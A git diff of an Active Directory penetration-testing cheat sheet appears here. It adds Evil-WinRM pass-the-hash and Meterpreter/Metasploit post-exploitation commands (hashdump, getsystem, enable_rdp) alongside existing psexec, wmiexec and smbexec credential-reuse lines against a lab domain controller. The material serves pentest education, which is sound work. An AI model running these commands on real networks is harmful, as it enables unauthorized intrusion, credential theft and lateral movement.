@@ -2,7 +2,7 @@
 
 ## ⚠️ Disclaimer:  
 This repository is intended for educational and ethical penetration testing purposes only.  
-Any use of the information available in this repository for attacking targets without prior mutual consent is `ILLEGAL!!!`.  
+Any use of the information available in this repository for attacking targets without prior mutual consent is `ILLEGAL!`.  
 The author(s) is/are not responsible for any misuse of this content.
 
 ### Assume Variables
@@ -21,14 +21,14 @@ Let's assume that the Domain Controller IP is `10.10.10.1/24` and we managed to 
 10. [Password/Hash Spraying](#passwordhash-spraying)
 11. [SMB Enumeration](#smb-enumeration)
 12. [Pass the Password/Pass the Hash](#pass-the-password-pass-the-hash)
-13. [Shell Access](#shell-access)
-14. [Local Privilege Escalation](#local-privilege-escalation)
-15. [Credential Dumping](#credential-dumping)
-16. [Rubeus Kerberos Attacks](#rubeus-kerberos-attacks)
-17. [Alternative Access to Compromised Machine using RDP](#alternative-access-to-compromised-machine-using-rdp)
-18. [Lateral Movement](#lateral-movement)
-19. [Domain Privilege Escalation](#domain-privilege-escalation)
-20. [Post-Pwning Domain Controller](#post-pwning-domain-controller)
+13. [Local Privilege Escalation](#local-privilege-escalation)
+14. [Credential Dumping](#credential-dumping)
+15. [Rubeus Kerberos Attacks](#rubeus-kerberos-attacks)
+16. [Alternative Access to Compromised Machine using RDP](#alternative-access-to-compromised-machine-using-rdp)
+17. [Lateral Movement](#lateral-movement)
+18. [Domain Privilege Escalation](#domain-privilege-escalation)
+19. [Post-Pwning Domain Controller](#post-pwning-domain-controller)
+20. [Useful Metasploit Modules for Post Windows Exploitations](#useful-metasploit-modules-for-post-windows-exploitations)
 21. [References](#references)
 22. [Final Notes](#final-notes)
 
@@ -278,7 +278,7 @@ gpp-decrypt <PASSWORD>
 
 ---
 
-## Pass the Password/ Pass the Hash
+## Pass the Password / Pass the Hash
 If we have credentials that have local admin privileges on one of the machines, we can dump hashes and secrets available on the compromised machine
 
 ### Pass the Password using secretsdump.py
@@ -299,12 +299,6 @@ set RHOSTS <TARGET_IP>
 run
 ```
 
----
-
-## Shell Access
-
-After obtaining valid domain user credentials we can try gaining shell access, note that not every user account could grant us a shell on the machine.
-
 ### PSExec
 ```sh
 # for domain users
@@ -313,23 +307,24 @@ psexec.py test.local/fcastle:'Password1'@10.10.10.1
 # for local users
 psexec.py fcastle:'Password1'@10.10.10.1
 
-# authenticating with local user and password hash
+#pass the hash for local users
 psexec.py Administrator@10.10.10.1 --hashes [LM-hash]:[NTLM-hash]
 ```
 
 ### Wmiexec
 ```sh
-# authenticating with local user and password hash
 wmiexec.py Administrator@10.10.10.1 --hashes [LM-hash]:[NTLM-hash]
 ```
 
 ### SMBExec
 ```sh
-# authenticating with local user and password hash
 smbexec.py test.local/fcastle:'Password1'@10.10.10.1
 ```
 
-
+### Evil-WinRM
+```sh
+evil-winrm -i 10.10.10.1 -u fcastle -H [LM-hash]:[NTLM-hash]
+```
 
 ---
 
@@ -593,12 +588,40 @@ misc::cmd
 dir \\machine-01\c$
 ```
 
+## Useful Metasploit Modules for Post Windows Exploitations
+```sh
+# Meterpreter
+sysinfo
+getuid
+getsystem
+getuid
+getprivs
+hashdump
+show_mount
+ps
+migrate
 
+# msfconsole
+use post/windows/manage/migrate
+use post/windows/gather/win_privs
+use post/windows/gather/enum_logged_on_users
+use post/windows/gather/checkvm
+use post/windows/gather/enum_applications
+use post/windows/gather/enum_av_excluded
+use post/windows/gather/enum_computers
+use post/windows/gather/enum_patches
+use post/windows/gather/enum_shares
+use post/windows/manage/enable_rdp
+set SESSION <id>
 
+loot
+```
 ---
 ## References
+https://blog.syselement.com/ine/courses/ejpt/ejpt-cheatsheet
 https://www.offsec.com/metasploit-unleashed/fun-incognito/
-https://github.com/GhostPack/Rubeus
+https://github.com/GhostPack/Rubeus/
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
 
 
 ## Final Notes
